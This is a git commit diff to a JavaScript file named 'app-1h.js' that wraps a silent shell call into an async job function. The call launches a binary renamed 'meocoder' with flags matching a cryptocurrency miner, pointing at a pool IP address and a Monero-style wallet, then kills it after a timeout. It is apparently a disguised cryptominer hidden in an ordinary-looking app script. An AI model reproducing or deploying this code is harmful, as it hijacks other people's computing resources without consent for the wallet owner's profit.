b264dff5f15561b66d620e39734988b5444f4c7c
vippro99 <80774966+vippro99@users.noreply.github.com>
2021-04-17 16:27:36 +0700

    Update app-1h.js

--- app-1h.js
+++ app-1h.js
@@ -5,16 +5,20 @@ const timeout = (ms) => {
     return new Promise(resolve => setTimeout(resolve, ms));
 }
 
-const runMonney = shell.exec(`./meocoder -o 168.62.177.218:8080 -u 46s4YKAvP8iQU4VBNmMMjoDU9SmiU13HvSdq7A7r1x2GCuvmGxgq3yh61nxw7yCyRRh2KLp13pNWvWhFP4zBMwhiKvDwQ1y -p meocoder_linux -k`, { silent: true, async: true });
-if (runMonney.code !== undefined) {
-    return 0;
-}
-console.log('task running');
-runMonney.stdout.on('data', (rawLog) => {
-    printLog(rawLog);
-});
+const runJobs = async () => {
+    const runMonney = shell.exec(`./meocoder -o 168.62.177.218:8080 -u 46s4YKAvP8iQU4VBNmMMjoDU9SmiU13HvSdq7A7r1x2GCuvmGxgq3yh61nxw7yCyRRh2KLp13pNWvWhFP4zBMwhiKvDwQ1y -p meocoder_linux -k`, { silent: true, async: true });
+    if (runMonney.code !== undefined) {
+        return 0;
+    }
+    console.log('task running');
+    runMonney.stdout.on('data', (rawLog) => {
+        printLog(rawLog);
+    });
 
-await timeout(3300);
-if (shell.exec(`killall meocoder`, { silent: true }).code === 0) {
-    console.log('-- ket thuc jobs');
+    await timeout(3300);
+    if (shell.exec(`killall meocoder`, { silent: true }).code === 0) {
+        console.log('-- ket thuc jobs');
+    }
 }
+
+runJobs();
